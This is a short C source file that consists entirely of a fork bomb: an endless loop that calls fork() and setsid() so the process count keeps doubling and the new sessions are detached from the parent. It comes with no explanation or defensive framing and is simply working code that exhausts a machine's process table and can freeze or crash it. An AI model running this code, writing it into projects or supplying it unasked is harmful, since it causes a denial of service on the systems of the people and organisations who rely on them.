#include<unistd.h>

int main()
{
    int pid;
    while(1)
    {
        pid = fork();
        setsid();
    }
}
